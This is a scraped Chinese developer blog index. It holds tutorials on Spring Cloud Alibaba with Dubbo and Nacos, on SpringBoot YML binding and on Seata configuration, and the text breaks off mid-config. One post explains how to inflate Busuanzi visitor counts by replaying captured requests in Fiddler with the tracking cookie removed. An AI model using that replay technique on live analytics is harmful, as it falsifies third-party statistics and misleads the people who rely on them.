&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring-cloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-dubbo&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-dubbo.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-nacos.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-nacos.version}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt; &lt;!-- 利用传递依赖，公共部分 --&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 1.4、创建 Service 2 工程Service 2 工程 的 Maven 配置如下： 1234567891011121314&lt;artifactId&gt;service-2&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;pom&lt;/packaging&gt;&lt;modules&gt; &lt;module&gt;service-2-api&lt;/module&gt; &lt;module&gt;services-2-business&lt;/module&gt;&lt;/modules&gt;&lt;parent&gt; &lt;artifactId&gt;alibaba-micro-service-study&lt;/artifactId&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt; 1.4.1、创建 Service 2 API 工程Service 2 API 工程非常简单，只负责声明服务接口，没有具体的实现，Maven 配置如下： 123456789&lt;artifactId&gt;service-2-api&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt;&lt;parent&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-2&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt; 声明服务接口 123456public interface ProviderService { public String add(Integer a, Integer b); public String sub(Integer a, Integer b);} 1.4.2、创建 Service 2 Business 工程引入 service-2-api 依赖，由于需用使用 Dubbo 供 service-1 模块进行远程调用，因此需要引入 spring-cloud-starter-dubbo 依赖 1234567891011121314151617181920212223242526272829&lt;artifactId&gt;services-2-business&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt;&lt;parent&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-2&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-2-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-dubbo&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建主启动类，添加 @EnableDiscoveryClient 注解，启用服务发现，将服务注册到 Nacos Server 12345678@SpringBootApplication@EnableDiscoveryClientpublic class Service2Application { public static void main(String[] args) { SpringApplication.run(Service2Application.class, args); }} 创建具体的服务接口实现类，添加 @DubboService 注解标记此类的方法暴露为 Dubbo 接口 1234567891011121314151617181920/** * 使用 @DubboService 注解标记此类的方法暴露为Dubbo接口 */@DubboServicepublic class ProviderServiceImpl implements ProviderService { private Logger LOG = LoggerFactory.getLogger(ProviderServiceImpl.class); @Override public String add(Integer a, Integer b) { LOG.info("service 2 business invoke"); return String.valueOf(a + b); } @Override public String sub(Integer a, Integer b) { LOG.info("service 2 business invoke"); return String.valueOf(a - b); }} 添加 bootstrap.yml 配置文件，加入 Dubbo 相关的配置内容 1234567891011121314151617181920212223242526272829303132server: port: ${port:56040} servlet: context‐path: /service2spring: application: name: service2 cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # 开发环境 cluster-name: DEFAULT config: server-addr: 127.0.0.1:8848 file-extension: yaml namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # 开发环境 group: NACOS_MICRO_SERVICE_GROUP # xxx业务组dubbo: scan: base-packages: com.alibaba.micro.study protocol: name: dubbo port: 20891 registry: address: nacos://127.0.0.1:8848 # 注册中心地址 application: qos-enable: false # Dubbo运维服务是否开启 consumer: check: false # 启动时就否检查依赖的服务 1.5、创建 Service 1 工程Service 1 工程 的 Maven 配置如下： 1234567891011121314&lt;artifactId&gt;service-1&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;pom&lt;/packaging&gt;&lt;modules&gt; &lt;module&gt;service-1-api&lt;/module&gt; &lt;module&gt;service-1-business&lt;/module&gt;&lt;/modules&gt;&lt;parent&gt; &lt;artifactId&gt;alibaba-micro-service-study&lt;/artifactId&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt; 1.5.1、创建 Service 1 API 工程Service 1 API 工程非常简单，只负责声明服务接口，没有具体的实现，Maven 配置如下： 123456789&lt;artifactId&gt;service-1-api&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt;&lt;parent&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-1&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt; 声明服务接口 1234public interface ConsumerService { public String add(Integer a, Integer b);} 1.5.2、创建 Service 1 Business 工程引入 service-1-api、service-2-api 依赖，由于需用使用 Dubbo 调用 service-2-business 的服务实现，因此需要引入 spring-cloud-starter-dubbo 依赖 12345678910111213141516171819202122232425262728293031323334&lt;artifactId&gt;service-1-business&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt;&lt;parent&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-1&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-1-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-2-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-dubbo&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建主启动类，添加 @EnableDiscoveryClient 注解，启用服务发现，将服务注册到 Nacos Server 12345678@SpringBootApplication@EnableDiscoveryClientpublic class Service1Application { public static void main(String[] args) { SpringApplication.run(Service1Application.class, args); }} 创建具体的服务接口实现类，添加 @DubboService 注解标记此类的方法暴露为 Dubbo 接口，同时使用 @DubboReference 注解生成接口代理对象，然后通过代理对象进行远程调用 service-2 的服务 1234567891011121314151617181920/** * 使用 @DubboService 注解标记此类的方法暴露为Dubbo接口 */@DubboServicepublic class ConsumerServiceImpl implements ConsumerService { /** * 生成接口代理对象，通过代理对象进行远程调用 */ @DubboReference private ProviderService providerService; private Logger LOG = LoggerFactory.getLogger(ConsumerServiceImpl.class); @Override public String add(Integer a, Integer b) { LOG.info("service 1 business invoke"); return providerService.add(a, b); }} 添加 bootstrap.yml 配置文件，加入 Dubbo 相关的配置内容 1234567891011121314151617181920212223242526272829303132server: port: ${port:56030} servlet: context‐path: /service1spring: application: name: service1 cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # 开发环境 cluster-name: DEFAULT config: server-addr: 127.0.0.1:8848 file-extension: yaml namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # 开发环境 group: NACOS_MICRO_SERVICE_GROUP # xxx业务组dubbo: scan: base-packages: com.alibaba.micro.study protocol: name: dubbo port: 20881 registry: address: nacos://127.0.0.1:8848 # 注册中心地址 application: qos-enable: false # Dubbo运维服务是否开启 consumer: check: false # 启动时就否检查依赖的服务 1.6、创建 Application 1 工程引入 service-1-api、service-2-api 依赖，由于需要使用 Dubbo 进行远程调用，因此还需要引入 spring-cloud-starter-dubbo 依赖 12345678910111213141516171819202122232425262728293031323334&lt;artifactId&gt;application-1&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt;&lt;parent&gt; &lt;artifactId&gt;alibaba-micro-service-study&lt;/artifactId&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-1-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-2-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-dubbo&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建主启动类，添加 @EnableDiscoveryClient 注解，启用服务发现，将服务注册到 Nacos Server 12345678@SpringBootApplication@EnableDiscoveryClientpublic class ApplicationBootstrap { public static void main(String[] args) { SpringApplication.run(ApplicationBootstrap.class, args); }} 创建 Controller 测试类，暴露供第三方调用的 HTTP API，同时使用 @DubboReference 注解生成接口代理对象，然后通过代理对象进行远程调用 service-1、service-2 的服务 1234567891011121314151617181920212223242526272829@RestControllerpublic class ApplicationController { /** * 生成接口代理对象，通过代理对象进行远程调用 */ @DubboReference private ConsumerService consumerService; /** * 生成接口代理对象，通过代理对象进行远程调用 */ @DubboReference private ProviderService providerService; private Logger LOG = LoggerFactory.getLogger(ApplicationController.class); @GetMapping("/add") public String add(Integer a, Integer b) { LOG.info("application invoke"); return consumerService.add(a, b); } @GetMapping("/sub") public String sub(Integer a, Integer b) { LOG.info("application invoke"); return providerService.sub(a, b); }} 添加 bootstrap.yml 配置文件，特别注意，这里并没有将 appplication-1 的任何 Dubbo 服务注册到 Nacos Server，只是单纯的作为 Dubbo 服务的消费者 1234567891011121314151617181920212223server: port: ${port:56020} servlet: context‐path: /application1spring: application: name: application1 cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # 开发环境 cluster-name: DEFAULT config: server-addr: 127.0.0.1:8848 file-extension: yaml namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # 开发环境 group: NACOS_MICRO_SERVICE_GROUP # xxx业务组dubbo: consumer: check: false # 启动时就否检查依赖的服务 1.7、创建 API 网关工程引入 Maven 依赖，由于使用了 Zuul 作为网关服务，因此需要引入 spring-cloud-starter-netflix-zuul 依赖，同时这里指定 Zuul 通过 Feign 将第三方的 HTTP 请求转发给 application-1 服务，还需要引入 spring-cloud-starter-openfeign 12345678910111213141516171819202122232425262728&lt;artifactId&gt;api-gateway&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt;&lt;parent&gt; &lt;artifactId&gt;alibaba-micro-service-study&lt;/artifactId&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建主启动类，添加 @EnableDiscoveryClient、@EnableZuulProxy 123456789@SpringBootApplication@EnableDiscoveryClient@EnableZuulProxypublic class GatewayApplication { public static void main(String[] args) { SpringApplication.run(GatewayApplication.class, args); }} 添加 bootstrap.yml 配置文件，由于路由的映射规则会经常发生改变，在生产环境中建议将下列 Zuul 相关的配置发布到 Nacos Server（配置中心 + 注册中心）中。为了演示方便，这里直接将 Zuul 的路由配置信息写在 bootstrap.yml 里。 12345678910111213141516171819202122232425server: port: ${port:56010} servlet: context‐path: /api-gatewayspring: application: name: api-gateway cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # 开发环境 cluster-name: DEFAULT config: server-addr: 127.0.0.1:8848 file-extension: yaml namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # 开发环境 group: NACOS_MICRO_SERVICE_GROUP # xxx业务组zuul: routes: application1: stripPrefix: false path: /application1/** 或者将 Zuul 的路由规则配置发布到 Nacos Server，而不是直接写在 bootstrap.yml 配置文件中，如下图所示： 1.8、测试应用代码 1）分别启动 service-2、service-1、application-1、api-gateway 应用 2）浏览器访问 http://127.0.0.1:56020/application1/sub?a=6&amp;b=2，若响应结果正确返回，则说明 service-2、application-1 服务运行正常 3）浏览器访问 http://127.0.0.1:56020/application1/add?a=3&amp;b=4，若响应结果正确返回，则说明 service-2、service-1、application-1 服务运行正常 4）浏览器访问 http://127.0.0.1:56010/api-gateway/application1/add?a=3&amp;b=4，若响应结果正确返回，则说明 service-2、service-1、application-1、api-gateway 服务运行正常 Nacos Server 的服务列表如下： 若希望测试各服务多实例的负载均衡调用情况，可以通过 -Dport=xxxxx VM 参数指定不同的端口来启动多个服务实例即可，这里不再累述 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"SpringBoot 读取 YML 配置文件的几种写法",url:"/posts/4c496bc8.html",text:'前言本文主要介绍 SpringBoot 读取 YML 配置文件的几种写法。 第一种写法添加 @Configuration 注解到 Bean 定义类，并使用 @Value 注解指定 YML 配置文件中的 Key。 123456shop: wechat: app-id: \'\' app-secret: \'\' encoding-token: \'\' encoding-aes-key: \'\' 1234567891011121314151617@Data@Configurationpublic class WechatProperties { @Value("${shop.wechat.app-id:}") private String appId; @Value("${shop.wechat.app-secret:}") private String appSecret; @Value("${shop.wechat.encoding-token:}") private String encodingToken; @Value("${shop.wechat.encoding-aes-key:}") private String encodingAesKey;} 第二种写法添加 @Configuration 和 @ConfigurationProperties 注解到 Bean 定义类，并使用 YML 配置文件中 Key 作为前缀。值得一提的是，这里即使不加 @Value 注解，SpringBoot 也会自动转换并匹配 Bean 定义类的属性名称。 123456shop: wechat: app-id: \'\' app-secret: \'\' encoding-token: \'\' encoding-aes-key: \'\' 1234567891011121314@Data@Configuration@ConfigurationProperties(prefix = "shop.wechat")public class WechatProperties { private String appId; private String appSecret; private String encodingToken; private String encodingAesKey;} 第三种方式添加 @Configuration 和 @ConfigurationProperties 注解到 Bean 定义类，并使用内部类和 YML 配置文件中 Key 作为前缀。值得一提的是，这里即使不加 @Value 注解，SpringBoot 也会自动转换并匹配 Bean 定义类的属性名称。 123456789shop: mail: \'example@gmail.com\' wechat: app-id: \'\' app-secret: \'\' encoding-token: \'\' encoding-aes-key: \'\' security: web-allow-others: true 123456789101112131415161718192021222324252627282930@Data@Configuration@ConfigurationProperties(prefix = "shop")public class ShopProperties { private String mail; private final Wechat wechat = new Wechat(); private final Security security = new Security(); private static class Wechat { private String appId; private String appSecret; private String encodingToken; private String encodingAesKey; } public static class Security { private boolean webAllowOthers; }} 第四种方式添加 @ConfigurationProperties 和 @NestedConfigurationProperty 注解到 Bean 定义类，并使用 @EnableConfigurationProperties 注解对 Bean 定义类的属性进行绑定 12345678xxl: job: admin: addresses: \'\' executor: port: 9913 ip: \'\' address: \'\' 1234567891011@Data@ConfigurationProperties(prefix = "xxl.job")public class XxlJobProperties { @NestedConfigurationProperty private XxlAdminProperties admin = new XxlAdminProperties(); @NestedConfigurationProperty private XxlExecutorProperties executor = new XxlExecutorProperties();} 123456@Datapublic class XxlAdminProperties { private String addresses;} 12345678910@Datapublic class XxlExecutorProperties { private String ip; private Integer port; private String address;} 123456789@SpringBootApplication@EnableConfigurationProperties(XxlJobProperties.class)public class ShopApplication { public static void main(String[] args) { SpringApplication.run(ShopApplication.class, args); }} 参考资料 @ConfigurationProperties 使用详解 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"不蒜子统计数据更改",url:"/posts/fc73f615.html",text:'前言由于不蒜子统计不对普通用户提供后台管理的功能，当站点的域名更换后，网站以前的所有统计数据都会重置为零。下面将介绍如何使用抓包工具来分析不蒜子统计的 API，进而实现不蒜子统计数据的更改。 Fiddler 下载这里使用了 Fiddler，它是一款流行的抓包工具，可以将网络传输发送与接受的数据包进行截获、重发、编辑、转存等操作。本质上，Fiddler 是通过改写 HTTP 代理，让数据从它那里通过，来监控并且截取到网络数据。 Fiddler 官网下载地址 ：https://www.telerik.com/download/fiddler Fiddler 离线下载地址：https://pan.baidu.com/s/1bpnp3Ef &nbsp;&nbsp;提取码：5skw 抓包分析1）启动 Fiddler 后，打开本地的浏览器访问博客的 URL，此时在 Fiddler 的界面上可以看到有关不蒜子的请求 1https://busuanzi.ibruce.info/busuanzi?jsonpCallback=BusuanziCallback_195655659654 2）观察请求的响应结果，可以发现其中包含了网站访问量的数据，不蒜子统计就是通过这个请求来统计网站的访问量，包括 site_pv、site_uv、page_pv 3）重新发送一条不蒜子请求，右击该请求，选择 Replay –&gt; Reissue Requests 4）查看请求响应的结果，发现 page_pv 和 site_pv 的值都递增了，在网页端查看也确实递增了 5）访客数 site_uv 的值，自然就是通过 Cookie 来实现了 6）Cookie 中有三条数据，尝试删除 busuanziId 后再次发送请求。首先选择 Replay –&gt; Reissue and Edit，在 Raw 选项里删去 Cookie 中的 busuanziId 这条数据，然后点击 Run to Completion 即可发送请求 7）从响应结果可以看到 site_uv 已经加 1 了，同时 page_pv 和 site_pv 也会分别加 1 更改统计数据现在就可以使用 Fiddler 的自动批量发包功能来刷访客数和访问量了，值得一提的是，这里也可以使用 JMeter 来刷统计数据。若刷访客数，则选中修改过 Cookie 的请求，右击选择 Replay –&gt; Reissue Sequentially，输入目标访问人数就可以很快刷上去了 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"爬虫"},{title:"Seata 入门教程 - 实战篇（电商）",url:"/posts/b0f7bd00.html",text:'上篇 - Seata 入门教程（基础篇） Seata 入门教程 - 基础篇 1、前言 本案例使用的是 Seata 的 AT 模式 由于篇幅有限，本案例只给出各个模块的核心代码和配置，点击下载完整的案例代码（简版） 为了方便演示，本案例只使用 Nacos 作为注册中心，不使用 Nacos 作为配置中心，即使用 file.conf 配置文件来存储 TC（Seata Server）相关的配置信息 最新发布的内容，已追加 TC（Seata Server）整合 Nacos 作为配置中心的教程，点击下载完整的案例代码（配置中心版） 1.1、版本说明 MySQL 5.7 Nacos Server 1.4.0 Seata Server 1.4.0 Springt Boot 2.3.2.RELEASE Spring Cloud Hoxton.SR8 Spring Cloud Alibaba 2.2.3.RELEASE 特别注意：Spring Boot 和 Spring Cloud 以及 Spring Cloud Alibaba 的版本号需要互相对应，否则可能会存在各种问题，具体可以参考官方的版本说明 1.2、案例目标本案例将会创建三个服务，分别是订单服务、库存服务、账户服务，各服务之间的调用流程如下： 1）当用户下单时，调用订单服务创建一个订单，然后通过远程调用（OpenFeign）让库存服务扣减下单商品的库存 2）订单服务再通过远程调用（OpenFeign）让账户服务来扣减用户账户里面的余额 3）最后在订单服务中修改订单状态为已完成 上述操作跨越了三个数据库，有两次远程调用，很明显会有分布式事务的问题，项目的整体结构如下： 12345seata-transaction-demo├── seata-common-api # API模块├── seata-account-service # 账户模块，端口：2002├── seata-storage-service # 库存模块，端口：2000└── seata-order-service # 订单模块，端口：2001 1.3、Seata 分布式交易解决方案 2、准备工作2.1、初始化数据库本案例使用 MySQL 数据库来存储 Seata Server（TC）的全局事务会话信息，因此需要执行 SQL 初始化脚本来创建本案例需要的 Seata 数据库、对应的业务库与业务表。由于 Seata 的 SEATA、AT 模式均需要用到 UNDO_LOG 回滚日志表，因此在每个业务数据库里都要单独创建 UNDO_LOG 回滚日志表，最终所有用到的数据库和业务表如下图所示： 2.2、Nacos 创建命名空间在 Nacos 的控制台创建新的命名空间，后面会将命名空间写在 registry.confg 配置文件中，让 Seata Server 将自身的服务注册到 Nacos 3、配置 Seata Server3.1、创建 file.conffile.conf 是 Seata Server（TC）的配置文件，用于指定 TC 的相关配置，核心配置如下： 123456789101112131415161718192021222324252627service { vgroupMapping.seata-order-service-tx-group = "default" vgroupMapping.seata-storage-service-tx-group = "default" vgroupMapping.seata-account-service-tx-group = "default"}store { mode = "db" db { ## the implement of javax.sql.DataSource, such as DruidDataSource(druid)/BasicDataSource(dbcp)/HikariDataSource(hikari) etc. datasource = "druid" ## mysql/oracle/postgresql/h2/oceanbase etc. dbType = "mysql" driverClassName = "com.mysql.cj.jdbc.Driver" url = "jdbc:mysql://127.0.0.1:3306/seata?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false" user = "root" password = "123456" minConn = 5 maxConn = 100 globalTable = "global_table" branchTable = "branch_table" lockTable = "lock_table" queryLimit = 100 maxWait = 5000 }} ★file.conf 完整配置★ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154transport { # tcp udt unix-domain-socket type = "TCP" #NIO NATIVE server = "NIO" #enable heartbeat heartbeat = true #thread factory for netty thread-factory { boss-thread-prefix = "NettyBoss" worker-thread-prefix = "NettyServerNIOWorker" server-executor-thread-prefix = "NettyServerBizHandler" share-boss-worker = false client-selector-thread-prefix = "NettyClientSelector" client-selector-thread-size = 1 client-worker-thread-prefix = "NettyClientWorkerThread" # netty boss thread size,will not be used for UDT boss-thread-size = 1 #auto default pin or 8 worker-thread-size = 8 } shutdown { # when destroy server, wait seconds wait = 3 } serialization = "seata" compressor = "none"}service { vgroupMapping.seata-order-service-tx-group = "default" vgroupMapping.seata-storage-service-tx-group = "default" vgroupMapping.seata-account-service-tx-group = "default" default.grouplist = "127.0.0.1:8091" enableDegrade = false disable = false max.commit.retry.timeout = "-1" max.rollback.retry.timeout = "-1" disableGlobalTransaction = false}client { async.commit.buffer.limit = 10000 lock { retry.internal = 10 retry.times = 30 } report.retry.count = 5 tm.commit.retry.count = 1 tm.rollback.retry.count = 1}## transaction log store, only used in seata-serverstore { ## store mode: file、db、redis mode = "db" ## file store property file { ## store location dir dir = "sessionStore" # branch session size , if exceeded first try compress lockkey, still exceeded throws exceptions maxBranchSessionSize = 16384 # globe session size , if exceeded throws exceptions maxGlobalSessionSize = 512 # file buffer size , if exceeded allocate new buffer fileWriteBufferCacheSize = 16384 # when recover batch read size sessionReloadReadSize = 100 # async, sync flushDiskMode = async } ## database store property db { ## the implement of javax.sql.DataSource, such as DruidDataSource(druid)/BasicDataSource(dbcp)/HikariDataSource(hikari) etc. datasource = "druid" ## mysql/oracle/postgresql/h2/oceanbase etc. dbType = "mysql" driverClassName = "com.mysql.cj.jdbc.Driver" url = "jdbc:mysql://127.0.0.1:3306/seata?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false" user = "root" password = "123456" minConn = 5 maxConn = 100 globalTable = "global_table" branchTable = "branch_table" lockTable = "lock_table" queryLimit = 100 maxWait = 5000 } ## redis store property redis { host = "127.0.0.1" port = "6379" password = "" database = "0" minConn = 1 maxConn = 10 maxTotal = 100 queryLimit = 100 }}lock { ## the lock store mode: local、remote mode = "remote" local { ## store locks in user\'s database } remote { ## store locks in the seata\'s server }}recovery { #schedule committing retry period in milliseconds committing-retry-period = 1000 #schedule asyn committing retry period in milliseconds asyn-committing-retry-period = 1000 #schedule rollbacking retry period in milliseconds rollbacking-retry-period = 1000 #schedule timeout retry period in milliseconds timeout-retry-period = 1000}transaction { undo.data.validation = true undo.log.serialization = "jackson" undo.log.save.days = 7 #schedule delete expired undo_log in milliseconds undo.log.delete.period = 86400000 undo.log.table = "undo_log"}## metrics settingsmetrics { enabled = false registry-type = "compact" # multi exporters use comma divided exporter-list = "prometheus" exporter-prometheus-port = 9898}support { ## spring spring { # auto proxy the DataSource bean datasource.autoproxy = false }} 3.2、创建 registry.confregistry.conf 用于指定 TC 的注册中心和 TC 的配置文件，这里使用 Nacos 作为注册中心，但 TC 的配置信息直接从 file.conf 配置文件中读取，核心配置如下： 123456789101112131415161718192021registry { type = "nacos" nacos { application = "seata-server" serverAddr = "127.0.0.1:8848" group = "seata_demo" namespace = 